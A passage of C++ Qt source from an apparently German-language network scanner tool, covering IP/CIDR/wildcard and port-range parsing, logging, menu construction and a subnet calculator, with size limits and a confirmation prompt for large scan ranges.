ok;\r\n        int octet = part.toInt(&ok);\r\n        if (!ok || octet < 0 || octet > 255) {\r\n            return false;\r\n        }\r\n    }\r\n    return true;\r\n}\r\nQStringList IpScanner::parseCIDRRange(const QString &cidrNotation)\r\n{\r\n    QStringList result;\r\n    QStringList parts = cidrNotation.split('/');\r\n\r\n    if (parts.size() != 2) {\r\n        addLogEntry(\"Ungültige CIDR-Notation\", \"ERROR\");\r\n        return result;\r\n    }\r\n\r\n    QString network = parts[0].trimmed();\r\n    int prefixLength = parts[1].trimmed().toInt();\r\n\r\n    // Erweiterte CIDR-Unterstützung von /8 bis /30\r\n    if (prefixLength < 8 || prefixLength > 30) {\r\n        addLogEntry(QString(\"CIDR-Präfix %1 nicht unterstützt (8-30 erlaubt)\").arg(prefixLength), \"ERROR\");\r\n        return result;\r\n    }\r\n\r\n    // IP in Integer umwandeln\r\n    QStringList ipParts = network.split('.');\r\n    if (ipParts.size() != 4) {\r\n        addLogEntry(\"Ungültige IP-Adresse in CIDR-Notation\", \"ERROR\");\r\n        return result;\r\n    }\r\n\r\n    quint32 ipInt = 0;\r\n    for (int i = 0; i < 4; i++) {\r\n        bool ok;\r\n        int octet = ipParts[i].toInt(&ok);\r\n        if (!ok || octet < 0 || octet > 255) {\r\n            addLogEntry(\"Ungültiges IP-Oktett\", \"ERROR\");\r\n            return result;\r\n        }\r\n        ipInt = (ipInt << 8) + octet;\r\n    }\r\n\r\n    // Netzwerk-Maske berechnen\r\n    quint32 mask = 0xFFFFFFFF << (32 - prefixLength);\r\n    quint32 networkInt = ipInt & mask;\r\n\r\n    // Anzahl der Host-Bits\r\n    int hostBits = 32 - prefixLength;\r\n    quint32 maxHosts = (1 << hostBits) - 2; // Ohne Netzwerk- und Broadcast-Adresse\r\n\r\n    // Sicherheitsbegrenzung für sehr große Bereiche\r\n    const quint32 MAX_SCAN_HOSTS = 65536; // Maximal 65536 Hosts scannen\r\n    if (maxHosts > MAX_SCAN_HOSTS) {\r\n        addLogEntry(QString(\"CIDR-Bereich zu groß (%1 Hosts). Maximal %2 Hosts erlaubt\")\r\n                        .arg(maxHosts).arg(MAX_SCAN_HOSTS), \"WARNING\");\r\n\r\n        // Benutzer fragen, ob er trotzdem fortfahren möchte\r\n        QMessageBox::StandardButton reply = QMessageBox::question(\r\n            nullptr, \"Großer IP-Bereich\",\r\n            QString(\"Der angegebene Bereich enthält %1 Hosts.\\n\"\r\n                    \"Dies kann sehr lange dauern und Netzwerk-Ressourcen belasten.\\n\\n\"\r\n                    \"Möchten Sie trotzdem fortfahren?\").arg(maxHosts),\r\n            QMessageBox::Yes | QMessageBox::No);\r\n\r\n        if (reply == QMessageBox::No) {\r\n            return result;\r\n        }\r\n\r\n        // Auf Maximum begrenzen\r\n        maxHosts = MAX_SCAN_HOSTS;\r\n    }\r\n\r\n    // IPs generieren\r\n    for (quint32 i = 1; i <= maxHosts; ++i) {\r\n        quint32 hostInt = networkInt + i;\r\n\r\n        // Integer zu IP-String konvertieren\r\n        QString ip = QString(\"%1.%2.%3.%4\")\r\n                         .arg((hostInt >> 24) & 0xFF)\r\n                         .arg((hostInt >> 16) & 0xFF)\r\n                         .arg((hostInt >> 8) & 0xFF)\r\n                         .arg(hostInt & 0xFF);\r\n\r\n        result.append(ip);\r\n    }\r\n\r\n    addLogEntry(QString(\"CIDR %1/%2 erkannt: %3 Hosts\")\r\n                    .arg(network).arg(prefixLength).arg(result.size()), \"INFO\");\r\n\r\n    return result;\r\n}\r\n\r\n// Erweiterte Range-Unterstützung\r\nQStringList IpScanner::parseIPRange(const QString &rangeString)\r\n{\r\n    QStringList result;\r\n\r\n    if (rangeString.contains(\" - \") || rangeString.contains(\"-\")) {\r\n        // Verschiedene Range-Formate unterstützen:\r\n        // 192.168.1.1-254          (Letzte Oktett)\r\n        // 192.168.1.1-192.168.1.254 (Vollständige IPs)\r\n        // 192.168.1-10.1           (Drittes Oktett)\r\n        // 10.0-255.1.1             (Zweites Oktett)\r\n\r\n        QStringList parts = rangeString.split(QRegularExpression(\"\\\\s*-\\\\s*\"));\r\n        if (parts.size() == 2) {\r\n            QString startIP = parts[0].trimmed();\r\n            QString endPart = parts[1].trimmed();\r\n\r\n            result = generateIPRange(startIP, endPart);\r\n        }\r\n    }\r\n\r\n    return result;\r\n}\r\nQStringList IpScanner::parseWildcardRange(const QString &wildcardString)\r\n{\r\n    QStringList result;\r\n    QStringList parts = wildcardString.split('.');\r\n\r\n    if (parts.size() != 4) {\r\n        addLogEntry(\"Ungültiges Wildcard-Format\", \"ERROR\");\r\n        return result;\r\n    }\r\n\r\n    // Wildcards in Bereiche umwandeln\r\n    QList<QList<int>> ranges;\r\n    for (const QString &part : parts) {\r\n        QList<int> range;\r\n        if (part == \"*\") {\r\n            // Vollständiger Bereich für dieses Oktett\r\n            for (int i = 0; i <= 255; ++i) {\r\n                range.append(i);\r\n            }\r\n        } else if (part.contains('-')) {\r\n            // Bereich im Oktett (z.B. 1-50)\r\n            QStringList rangeParts = part.split('-');\r\n            if (rangeParts.size() == 2) {\r\n                int start = rangeParts[0].toInt();\r\n                int end = rangeParts[1].toInt();\r\n                for (int i = start; i <= end && i <= 255; ++i) {\r\n                    range.append(i);\r\n                }\r\n            }\r\n        } else {\r\n            // Einzelner Wert\r\n            int value = part.toInt();\r\n            if (value >= 0 && value <= 255) {\r\n                range.append(value);\r\n            }\r\n        }\r\n        ranges.append(range);\r\n    }\r\n\r\n    // Alle Kombinationen generieren\r\n    const int MAX_WILDCARD_COMBINATIONS = 10000;\r\n    int totalCombinations = 1;\r\n    for (const auto &range : ranges) {\r\n        totalCombinations *= range.size();\r\n    }\r\n\r\n    if (totalCombinations > MAX_WILDCARD_COMBINATIONS) {\r\n        addLogEntry(QString(\"Wildcard-Bereich zu groß (%1 Kombinationen). Maximal %2 erlaubt\")\r\n                        .arg(totalCombinations).arg(MAX_WILDCARD_COMBINATIONS), \"WARNING\");\r\n        return result;\r\n    }\r\n\r\n    // IPs aus Wildcards generieren\r\n    for (int a : ranges[0]) {\r\n        for (int b : ranges[1]) {\r\n            for (int c : ranges[2]) {\r\n                for (int d : ranges[3]) {\r\n                    QString ip = QString(\"%1.%2.%3.%4\").arg(a).arg(b).arg(c).arg(d);\r\n                    result.append(ip);\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    addLogEntry(QString(\"Wildcard %1 erkannt: %2 IPs\")\r\n                    .arg(wildcardString).arg(result.size()), \"INFO\");\r\n\r\n    return result;\r\n}\r\n\r\n// Hilfsfunktion für IP-Range-Generierung\r\nQStringList IpScanner::generateIPRange(const QString &startIP, const QString &endPart)\r\n{\r\n    QStringList result;\r\n    QStringList startParts = startIP.split('.');\r\n\r\n    if (startParts.size() != 4) {\r\n        addLogEntry(\"Ungültige Start-IP\", \"ERROR\");\r\n        return result;\r\n    }\r\n\r\n    // Prüfen ob endPart eine vollständige IP oder nur ein Oktett ist\r\n    if (endPart.contains('.')) {\r\n        // Vollständige End-IP\r\n        QStringList endParts = endPart.split('.');\r\n        if (endParts.size() != 4) {\r\n            addLogEntry(\"Ungültige End-IP\", \"ERROR\");\r\n            return result;\r\n        }\r\n\r\n        // Range zwischen zwei vollständigen IPs\r\n        quint32 startInt = ipToInt(startIP);\r\n        quint32 endInt = ipToInt(endPart);\r\n\r\n        if (endInt < startInt) {\r\n            addLogEntry(\"End-IP ist kleiner als Start-IP\", \"ERROR\");\r\n            return result;\r\n        }\r\n\r\n        const quint32 MAX_RANGE_SIZE = 65536;\r\n        quint32 rangeSize = endInt - startInt + 1;\r\n\r\n        if (rangeSize > MAX_RANGE_SIZE) {\r\n            addLogEntry(QString(\"IP-Range zu groß (%1 IPs). Maximal %2 erlaubt\")\r\n                            .arg(rangeSize).arg(MAX_RANGE_SIZE), \"WARNING\");\r\n            rangeSize = MAX_RANGE_SIZE;\r\n        }\r\n\r\n        for (quint32 i = 0; i < rangeSize; ++i) {\r\n            quint32 currentInt = startInt + i;\r\n            QString ip = intToIP(currentInt);\r\n            result.append(ip);\r\n        }\r\n\r\n    } else {\r\n        // Nur letztes Oktett als Ende\r\n        int endOctet = endPart.toInt();\r\n        int startOctet = startParts[3].toInt();\r\n\r\n        if (endOctet < startOctet || endOctet > 255) {\r\n            addLogEntry(\"Ungültiger End-Oktett-Wert\", \"ERROR\");\r\n            return result;\r\n        }\r\n\r\n        QString baseIP = QString(\"%1.%2.%3.\").arg(startParts[0], startParts[1], startParts[2]);\r\n\r\n        for (int i = startOctet; i <= endOctet; ++i) {\r\n            result.append(baseIP + QString::number(i));\r\n        }\r\n    }\r\n\r\n    addLogEntry(QString(\"IP-Range %1-%2 erkannt: %3 IPs\")\r\n                    .arg(startIP).arg(endPart).arg(result.size()), \"INFO\");\r\n\r\n    return result;\r\n}\r\nquint32 IpScanner::ipToInt(const QString &ip)\r\n{\r\n    QStringList parts = ip.split('.');\r\n    if (parts.size() != 4) return 0;\r\n\r\n    quint32 result = 0;\r\n    for (int i = 0; i < 4; i++) {\r\n        result = (result << 8) + parts[i].toUInt();\r\n    }\r\n    return result;\r\n}\r\n\r\nQString IpScanner::intToIP(quint32 ip)\r\n{\r\n    return QString(\"%1.%2.%3.%4\")\r\n    .arg((ip >> 24) & 0xFF)\r\n        .arg((ip >> 16) & 0xFF)\r\n        .arg((ip >> 8) & 0xFF)\r\n        .arg(ip & 0xFF);\r\n}\r\nQList<int> IpScanner::parsePortRange(const QString &range)\r\n{\r\n    QList<int> ports;\r\n\r\n    addLogEntry(QString(\"Parse Port-Bereich: %1\").arg(range), \"DEBUG\");\r\n\r\n    if (range.contains('-')) {\r\n        // Range format like \"1-1000\"\r\n        QStringList parts = range.split('-');\r\n        if (parts.size() == 2) {\r\n            int start = parts[0].trimmed().toInt();\r\n            int end = parts[1].trimmed().toInt();\r\n            if (start > 0 && end <= 65535 && start <= end) {\r\n                for (int i = start; i <= end; ++i) {\r\n                    ports.append(i);\r\n                }\r\n                addLogEntry(QString(\"Port-Bereich: %1-%2 (%3 Ports)\").arg(start).arg(end).arg(ports.size()), \"INFO\");\r\n            }\r\n        }\r\n    } else if (range.contains(',')) {\r\n        // Comma-separated format like \"22,80,443\"\r\n        QStringList parts = range.split(',');\r\n        for (const QString &part : parts) {\r\n            int port = part.trimmed().toInt();\r\n            if (port > 0 && port <= 65535) {\r\n                ports.append(port);\r\n            }\r\n        }\r\n        addLogEntry(QString(\"Einzelne Ports: %1 (%2 Ports)\").arg(range).arg(ports.size()), \"INFO\");\r\n    } else {\r\n        // Single port\r\n        int port = range.trimmed().toInt();\r\n        if (port > 0 && port <= 65535) {\r\n            ports.append(port);\r\n            addLogEntry(QString(\"Einzelner Port: %1\").arg(port), \"INFO\");\r\n        }\r\n    }\r\n\r\n    return ports;\r\n}\r\n\r\nvoid IpScanner::addLogEntry(const QString &message, const QString &type)\r\n{\r\n    QString timestamp = QDateTime::currentDateTime().toString(\"dd.MM.yyyy hh:mm:ss\");\r\n    QString colorCode;\r\n    QString icon;\r\n\r\n    // Enhanced log entry formatting with colors and icons\r\n    if (type == \"SUCCESS\") {\r\n        colorCode = \"#00ff00\";\r\n        icon = \"✅\";\r\n    } else if (type == \"ERROR\") {\r\n        colorCode = \"#ff0000\";\r\n        icon = \"❌\";\r\n    } else if (type == \"WARNING\") {\r\n        colorCode = \"#ffaa00\";\r\n        icon = \"⚠️\";\r\n    } else if (type == \"DEBUG\") {\r\n        colorCode = \"#888888\";\r\n        icon = \"🔧\";\r\n    } else {\r\n        colorCode = \"#ffffff\";\r\n        icon = \"ℹ️\";\r\n    }\r\n\r\n    QString logEntry = QString(\"<span style='color: %1;'>[%2] %3 [%4] %5</span>\")\r\n                           .arg(colorCode, timestamp, icon, type, message);\r\n\r\n    logTextEdit->append(logEntry);\r\n    logTextEdit->ensureCursorVisible();\r\n\r\n    // Auto-scroll to bottom\r\n    QTextCursor cursor = logTextEdit->textCursor();\r\n    cursor.movePosition(QTextCursor::End);\r\n    logTextEdit->setTextCursor(cursor);\r\n}\r\n\r\nvoid IpScanner::setupMenuBar()\r\n{\r\n    // File Menu (bereits vorhanden - erweitert)\r\n    fileMenu = menuBar()->addMenu(\"📁 &Datei\");\r\n\r\n    newProjectAction = new QAction(\"🆕 &Neues Projekt\", this);\r\n    newProjectAction->setShortcut(QKeySequence::New);\r\n    fileMenu->addAction(newProjectAction);\r\n\r\n    openProjectAction = new QAction(\"📂 &Projekt öffnen\", this);\r\n    openProjectAction->setShortcut(QKeySequence::Open);\r\n    fileMenu->addAction(openProjectAction);\r\n\r\n    saveProjectAction = new QAction(\"💾 &Projekt speichern\", this);\r\n    saveProjectAction->setShortcut(QKeySequence::Save);\r\n    fileMenu->addAction(saveProjectAction);\r\n\r\n    fileMenu->addSeparator();\r\n\r\n    exportAction = new QAction(\"📤 &Ergebnisse exportieren\", this);\r\n    exportAction->setShortcut(QKeySequence(\"Ctrl+E\"));\r\n    fileMenu->addAction(exportAction);\r\n\r\n\r\n\r\n    QMenu *vulnerabilityMenu = menuBar()->addMenu(\"🔒 &Vulnerability\");\r\n\r\n    QAction *startVulnScanAction = new QAction(\"🔍 &Vulnerability Scan starten\", this);\r\n    startVulnScanAction->setShortcut(QKeySequence(\"Ctrl+V\"));\r\n    vulnerabilityMenu->addAction(startVulnScanAction);\r\n\r\n    QAction *stopVulnScanAction = new QAction(\"⏹️ Vulnerability Scan &stoppen\", this);\r\n    stopVulnScanAction->setShortcut(QKeySequence(\"Ctrl+Shift+V\"));\r\n    vulnerabilityMenu->addAction(stopVulnScanAction);\r\n\r\n    vulnerabilityMenu->addSeparator();\r\n\r\n    QAction *exportVulnReportAction = new QAction(\"📊 Vulnerability &Report exportieren\", this);\r\n    exportVulnReportAction->setShortcut(QKeySequence(\"Ctrl+R\"));\r\n    vulnerabilityMenu->addAction(exportVulnReportAction);\r\n\r\n    QAction *clearVulnResultsAction = new QAction(\"🗑️ Vulnerability Ergebnisse &löschen\", this);\r\n    vulnerabilityMenu->addAction(clearVulnResultsAction);\r\n\r\n    vulnerabilityMenu->addSeparator();\r\n\r\n    QAction *vulnSettingsAction = new QAction(\"⚙️ Vulnerability &Einstellungen\", this);\r\n    vulnerabilityMenu->addAction(vulnSettingsAction);\r\n\r\n    QAction *vulnDatabaseAction = new QAction(\"📚 Vulnerability &Datenbank aktualisieren\", this);\r\n    vulnerabilityMenu->addAction(vulnDatabaseAction);\r\n\r\n\r\n    connect(startVulnScanAction, &QAction::triggered, this, &IpScanner::startVulnerabilitySccan);\r\n    connect(stopVulnScanAction, &QAction::triggered, this, &IpScanner::stopVulnerabilitySccan);\r\n    connect(exportVulnReportAction, &QAction::triggered, this, &IpScanner::exportVulnerabilityReport);\r\n    connect(clearVulnResultsAction, &QAction::triggered, this, &IpScanner::clearVulnerabilityResults);\r\n    connect(vulnSettingsAction, &QAction::triggered, this, &IpScanner::showVulnerabilitySettings);\r\n    connect(vulnDatabaseAction, &QAction::triggered, this, &IpScanner::updateVulnerabilityDatabase);\r\n\r\n    // NEU: Netzwerk-Export Aktionen\r\n    QAction *exportNetworkAction = new QAction(\"🌐 &Netzwerk-Karte exportieren\", this);\r\n    exportNetworkAction->setShortcut(QKeySequence(\"Ctrl+Shift+E\"));\r\n    fileMenu->addAction(exportNetworkAction);\r\n\r\n    fileMenu->addSeparator();\r\n\r\n    exitAction = new QAction(\"🚪 &Beenden\", this);\r\n    exitAction->setShortcut(QKeySequence::Quit);\r\n    fileMenu->addAction(exitAction);\r\n\r\n    // Scan Menu (erweitert)\r\n    scanMenu = menuBar()->addMenu(\"🔍 &Scan\");\r\n    scanMenu->addAction(\"🏓 Schneller &Ping\", this, &IpScanner::pingHost);\r\n    scanMenu->addAction(\"🛤️ &Traceroute\", this, &IpScanner::traceroute);\r\n    scanMenu->addAction(\"🌐 &DNS Lookup\", this, &IpScanner::dnsLookup);\r\n    scanMenu->addSeparator();\r\n    scanMenu->addAction(\"🔒 &Vulnerability Scan\", this, &IpScanner::vulnScan);\r\n    scanMenu->addAction(\"⚙️ &Service Scan\", this, &IpScanner::serviceScan);\r\n\r\n    // NEU: Netzwerk Menu\r\n    QMenu *networkMenu = menuBar()->addMenu(\"🌐 &Netzwerk\");\r\n\r\n    QAction *networkDiscoveryAction = new QAction(\"🔍 &Netzwerk Erkennung\", this);\r\n    networkDiscoveryAction->setShortcut(QKeySequence(\"Ctrl+D\"));\r\n    networkMenu->addAction(networkDiscoveryAction);\r\n\r\n    QAction *arpScanAction = new QAction(\"📡 &ARP Scan\", this);\r\n    arpScanAction->setShortcut(QKeySequence(\"Ctrl+A\"));\r\n    networkMenu->addAction(arpScanAction);\r\n\r\n    networkMenu->addSeparator();\r\n\r\n    QAction *topologyAnalysisAction = new QAction(\"🗺️ &Topologie Analyse\", this);\r\n    topologyAnalysisAction->setShortcut(QKeySequence(\"Ctrl+T\"));\r\n    networkMenu->addAction(topologyAnalysisAction);\r\n\r\n    QAction *networkStatsAction = new QAction(\"📊 Netzwerk-&Statistiken\", this);\r\n    networkStatsAction->setShortcut(QKeySequence(\"Ctrl+S\"));\r\n    networkMenu->addAction(networkStatsAction);\r\n\r\n    QAction *healthCheckAction = new QAction(\"🏥 &Gesundheitscheck\", this);\r\n    healthCheckAction->setShortcut(QKeySequence(\"Ctrl+H\"));\r\n    networkMenu->addAction(healthCheckAction);\r\n\r\n    networkMenu->addSeparator();\r\n\r\n    QAction *refreshInterfacesAction = new QAction(\"🔄 Interfaces &Aktualisieren\", this);\r\n    refreshInterfacesAction->setShortcut(QKeySequence(\"F5\"));\r\n    networkMenu->addAction(refreshInterfacesAction);\r\n\r\n    // Tools Menu (bereits vorhanden - erweitert)\r\n    toolsMenu = menuBar()->addMenu(\"🔧 &Tools\");\r\n    toolsMenu->addAction(\"🔍 &WHOIS Lookup\", this, &IpScanner::whoIs);\r\n\r\n    toolsMenu->addSeparator();\r\n\r\n    // NEU: Erweiterte Tools\r\n    QAction *macLookupAction = new QAction(\"🏭 &MAC Hersteller Lookup\", this);\r\n    toolsMenu->addAction(macLookupAction);\r\n\r\n    QAction *subnetCalcAction = new QAction(\"🧮 &Subnetz Rechner\", this);\r\n    toolsMenu->addAction(subnetCalcAction);\r\n\r\n    toolsMenu->addSeparator();\r\n\r\n    settingsAction = new QAction(\"⚙️ &Einstellungen\", this);\r\n    toolsMenu->addAction(settingsAction);\r\n\r\n    // View Menu (NEU)\r\n    QMenu *viewMenu = menuBar()->addMenu(\"👁️ &Ansicht\");\r\n\r\n    QAction *expandAllAction = new QAction(\"📖 Alle &Erweitern\", this);\r\n    expandAllAction->setShortcut(QKeySequence(\"Ctrl+Plus\"));\r\n    viewMenu->addAction(expandAllAction);\r\n\r\n    QAction *collapseAllAction = new QAction(\"📖 Alle &Zuklappen\", this);\r\n    collapseAllAction->setShortcut(QKeySequence(\"Ctrl+Minus\"));\r\n    viewMenu->addAction(collapseAllAction);\r\n\r\n    viewMenu->addSeparator();\r\n\r\n    QAction *autoRefreshAction = new QAction(\"🔄 &Auto-Aktualisierung\", this);\r\n    autoRefreshAction->setCheckable(true);\r\n    autoRefreshAction->setChecked(false);\r\n    viewMenu->addAction(autoRefreshAction);\r\n\r\n    // Help Menu (bereits vorhanden)\r\n    helpMenu = menuBar()->addMenu(\"❓ &Hilfe\");\r\n    helpMenu->addAction(\"ℹ️ &Über\", this, &IpScanner::showAbout);\r\n    helpMenu->addAction(\"📋 &Tastenkürzel\", this, &IpScanner::showShortcuts);\r\n\r\n    // Connect neue Aktionen\r\n    connect(newProjectAction, &QAction::triggered, this, &IpScanner::clearResults);\r\n    connect(openProjectAction, &QAction::triggered, this, &IpScanner::loadProject);\r\n    connect(saveProjectAction, &QAction::triggered, this, &IpScanner::saveProject);\r\n    connect(exportAction, &QAction::triggered, this, &IpScanner::exportResults);\r\n    connect(exportNetworkAction, &QAction::triggered, this, &IpScanner::exportNetworkMap);\r\n    connect(exitAction, &QAction::triggered, this, &QWidget::close);\r\n\r\n    // Netzwerk-Menü Verbindungen\r\n    connect(networkDiscoveryAction, &QAction::triggered, this, &IpScanner::networkDiscovery);\r\n    connect(arpScanAction, &QAction::triggered, this, &IpScanner::arpScan);\r\n    connect(topologyAnalysisAction, &QAction::triggered, this, &IpScanner::analyzeNetworkTopology);\r\n    connect(networkStatsAction, &QAction::triggered, this, &IpScanner::showNetworkStatistics);\r\n    connect(healthCheckAction, &QAction::triggered, this, &IpScanner::performNetworkHealthCheck);\r\n    connect(refreshInterfacesAction, &QAction::triggered, this, &IpScanner::refreshNetworkInterfaces);\r\n\r\n    // Tools-Menü Verbindungen\r\n    connect(macLookupAction, &QAction::triggered, this, &IpScanner::showMacLookup);\r\n    connect(subnetCalcAction, &QAction::triggered, this, &IpScanner::showSubnetCalculator);\r\n    connect(settingsAction, &QAction::triggered, this, &IpScanner::showSettings);\r\n\r\n    // View-Menü Verbindungen\r\n    connect(expandAllAction, &QAction::triggered, [this]() {\r\n        hostTreeWidget->expandAll();\r\n        networkTree->expandAll();\r\n        addLogEntry(\"Alle Einträge erweitert\", \"INFO\");\r\n    });\r\n\r\n    connect(collapseAllAction, &QAction::triggered, [this]() {\r\n        hostTreeWidget->collapseAll();\r\n        networkTree->collapseAll();\r\n        addLogEntry(\"Alle Einträge zugeklappt\", \"INFO\");\r\n    });\r\n\r\n    connect(autoRefreshAction, &QAction::toggled, [this](bool enabled) {\r\n        if (enabled) {\r\n            // Auto-refresh timer setup (future implementation)\r\n            addLogEntry(\"Auto-Aktualisierung aktiviert\", \"INFO\");\r\n        } else {\r\n            addLogEntry(\"Auto-Aktualisierung deaktiviert\", \"INFO\");\r\n        }\r\n    });\r\n}\r\nvoid IpScanner::refreshNetworkInterfaces()\r\n{\r\n    interfaceCombo->clear();\r\n    QStringList interfaces = getLocalInterfaces();\r\n    interfaceCombo->addItems(interfaces);\r\n\r\n    addLogEntry(\"Netzwerk-Interfaces aktualisiert\", \"INFO\");\r\n    statusBar()->showMessage(\"Netzwerk-Interfaces aktualisiert\", 2000);\r\n}\r\nvoid IpScanner::showSubnetCalculator()\r\n{\r\n    // Subnet Calculator Tool\r\n    QDialog *subnetDialog = new QDialog(this);\r\n    subnetDialog->setWindowTitle(\"🧮 Subnetz Rechner\");\r\n    subnetDialog->resize(600, 500);\r\n    subnetDialog->setStyleSheet(styleSheet());\r\n\r\n    QVBoxLayout *layout = new QVBoxLayout(subnetDialog);\r\n\r\n    // Input section\r\n    QGroupBox *inputGroup = new QGroupBox(\"📥 Eingabe\");\r\n    QGridLayout *inputLayout = new QGridLayout(inputGroup);\r\n\r\n    QLineEdit *ipEdit = new QLineEdit();\r\n    ipEdit->setPlaceholderText(\"z.B. 192.168.1.0\");\r\n    QSpinBox *cidrSpinBox = new QSpinBox();\r\n    cidrSpinBox->setRange(1, 32);\r\n    cidrSpinBox->setValue(24);\r\n\r\n    inputLayout->addWidget(new QLabel(\"IP-Adresse:\"), 0, 0);\r\n    inputLayout->addWidget(ipEdit, 0, 1);\r\n    inputLayout->addWidget(new QLabel(\"CIDR:\"), 0, 2);\r\n    inputLayout->addWidget(cidrSpinBox, 0, 3);\r\n\r\n    QPushButton *calculateButton = new QPushButton(\"🧮 Berechnen\");\r\n    inputLayout->addWidget(calculateButton, 1, 0, 1, 4);\r\n\r\n    // Result section\r\n    QTextEdit *resultEdit = new QTextEdit();\r\n    resultEdit->setReadOnly(true);\r\n    resultEdit->setFont(QFont(\"Consolas\", 10));\r\n\r\n    // Buttons\r\n    QHBoxLayout *buttonLayout = new QHBoxLayout();\r\n    QPushButton *clearButton = new QPushButton(\"🗑️ Löschen\");\r\n    QPushButton *closeButton = new QPushButton(\"❌ Schließen\");\r\n\r\n    buttonLayout->addWidget(clearButton);\r\n    buttonLayout->addStretch();\r\n    buttonLayout->addWidget(closeButton);\r\n\r\n    layout->addWidget(inputGroup);\r\n    layout->addWidget(resultEdit);\r\n    layout->addLayout(buttonLayout);\r\n\r\n    // Connect signals\r\n    connect(calculateButton, &QPushButton::clicked, [ipEdit, cidrSpinBox, resultEdit, this]() {\r\n        QString ip = ipEdit->text().trimmed();\r\n        int cidr = cidrSpinBox->value();\r\n\r\n        if (ip.isEmpty()) {\r\n            resultEdit->setPlainText(\"❌ Bitte geben Sie eine IP-Adresse ein!\");\r\n            return;\r\n        }\r\n\r\n        // Validate IP address\r\n        QStringList ipParts = ip.split('.');\r\n        if (ipParts.size() != 4) {\r\n            resultEdit->setPlainText(\"❌ Ungültige IP-Adresse Format!\");\r\n            return;\r\n        }\r\n\r\n        bool valid = true;\r\n        for (const QString &part : ipParts) {\r\n            int num = part.toInt(&valid);\r\n            if (!valid || num < 0 || num > 255) {\r\n                resultEdit->setPlainText(\"❌ Ungültige IP-Adresse!\");\r\n                return;\r\n            }\r\n        }\r\n\r\n        // Calculate subnet information\r\n        QString result = calculateSubnetInfo(ip, cidr);\r\n        resultEdit->setPlainText(result);\r\n        addLogEntry(QString(\"Subnetz-Berechnung: %1/%2\").arg(ip).arg(cidr), \"INFO\");\r\n    });\r\n\r\n    connect(clearButton, &QPushButton::clicked, [ipEdit, cidrSpinBox, resultEdit]() {\r\n        ipEdit->clear();\r\n        cidrSpinBox->setValue(24);\r\n        resultEdit->clear();\r\n    });\r\n\r\n    connect(closeButton, &QPushButton::clicked, subnetDialog, &QDialog::accept);\r\n\r\n    // Enable Enter key for calculation\r\n    connect(ipEdit, &QLineEdit::returnPressed, calculateButton, &QPushButton::click);\r\n\r\n    subnetDialog->exec();\r\n}\r\nQString IpScanner::calculateSubnetInfo(const QString &ip, int cidr)\r\n{\r\n    // Convert IP to 32-bit integer\r\n    QStringList ipParts = ip.split('.');\r\n    quint32 ipInt = 0;\r\n    for (int i = 0; i < 4; i++) {\r\n        ipInt = (ipInt << 8) + ipParts[i].toUInt();\r\n    }\r\n\r\n    // Calculate subnet mask\r\n    quint32 mask = 0xFFFFFFFF << (32 - cidr);\r\n\r\n    // Calculate network address\r\n    quint32 networkInt = ipInt & mask;\r\n\r\n    // Calculate broadcast address\r\n    quint32 broadcastInt = networkInt | (~mask);\r\n\r\n    // Calculate first and last host addresses\r\n    quint32 firstHostInt = networkInt + 1;\r\n    quint32 lastHostInt = broadcastInt - 1;\r\n\r\n    // Calculate number of hosts\r\n    quint32 totalHosts = (~mask) + 1;\r\n    quint32 usableHosts = totalHosts - 2; // Subtract network and broadcast\r\n\r\n    // Convert back to dotted decimal notation\r\n    auto intToIp = [](quint32 addr) -> QString {\r\n        return QString(\"%1.%2.%3.%4\")\r\n        .arg((addr >> 24) & 0xFF)\r\n            .arg((addr >> 16) & 0xFF)\r\n            .arg((addr >> 8) & 0xFF)\r\n            .arg(addr & 0xFF);\r\n    };\r\n\r\n    QString networkAddr = intToIp(networkInt);\r\n    QString broadcastAddr = intToIp(broadcastInt);\r\n    QString firstHostAddr = intToIp(firstHostInt);\r\n    QString lastHostAddr = intToIp(lastHostInt);\r\n    QString subnetMask = intToIp(mask);\r\n\r\n    // Build result string\r\n    QString result = QString(R\"(\r\n🧮 SUBNETZ BERECHNUNG ERGEBNISSE\r\n===============================================\r\n\r\n📍 EINGABE:\r\n   IP-Adresse: %1\r\n   CIDR Notation: /%2\r\n\r\n🌐 NETZWERK INFORMATIONEN:\r\n   Netzwerk-Adresse:    %3\r\n   Subnetz-Maske:       %4\r\n   Broadcast-Adresse:   %5\r\n\r\n👥 HOST BEREICH:\r\n   Erster Host:         %6\r\n   Letzter Host:        %7\r\n\r\n📊 KAPAZITÄT:\r\n   Gesamte Adressen:    %8\r\n   Nutzbare Hosts:      %9\r\n\r\n🔧 ZUSÄTZLICHE INFORMATIONEN:\r\n   Netzwerk-Klasse:     %10\r\n   Subnetz-Typ:         %11\r\n   Wildcard-Maske:      %12\r\n\r\n💡 VERWENDUNGSHINWEISE:\r\n   • Netzwerk-Adresse (%3) für Routing-Tabellen\r\n   • Broadcast-Adresse (%5) für Netzwerk-weite Nachrichten\r\n   • Host-Bereich (%6 - %7) für Geräte-Zuweisung\r\n    )\").arg(ip)\r\n                         .arg(cidr)\r\n                         .arg(networkAddr)\r\n                         .arg(subnetMask)\r\n                         .arg(broadcastAddr)\r\n                         .arg(firstHostAddr)\r\n                         .arg(lastHostAddr)\r\n                         .arg(totalHosts)\r\n                         .arg(usableHosts)\r\n                         .arg(getNetworkClass(networkInt))\r\n                         .arg(getSubnetType(cidr))\r\n                         .arg(intToIp(~mask));\r\n\r\n    return result;\r\n}\r\nQString IpScanner::getNetworkClass(quint32 networkAddr)\r\n{\r\n    quint8 firstOctet = (networkAddr >> 24) & 0xFF;\r\n\r\n    if (firstOctet >= 1 && firstOctet <= 126) {\r\n        return \"Klasse A (1.0.0.0 - 126.255.255.255)\";\r\n    } else if (firstOctet >= 128 && firstOctet <= 191) {\r\n        return \"Klasse B (128.0.0.0 - 191.255.255.255)\";\r\n    } else if (firstOctet >= 192 && firstOctet <= 223) {\r\n        return \"Klasse C (192.0.0.0 - 223.255.255.255)\";\r\n    } else if (firstOctet >= 224 && firstOctet <= 239) {\r\n        return \"Klasse D (Multicast)\";\r\n    } else if (firstOctet >= 240 && firstOctet <= 255) {\r\n        return \"Klasse E (Experimentell)\";\r\n    } else {\r\n        return \"Unbekannte Klasse\";\r\n    }\r\n}\r\nQString IpScanner::getSubnetType(int cidr)\r\n{\r\n    if (cidr >= 30) {\r\n        return \"Point-to-Point Link (/30-/32)\";\r\n    } else if (cidr >= 24) {\r\n        return \"Kleines LAN (/24-/29)\";\r\n    } else if (cidr >= 16) {\r\n        return \"Mittleres Netzwerk (/16-/23)\";\r\n    } else if (cidr >= 8) {\r\n        return \"Großes Netzwerk (/8-/15)\";\r\n    } else {\r\n        return \"Sehr großes Netzwerk 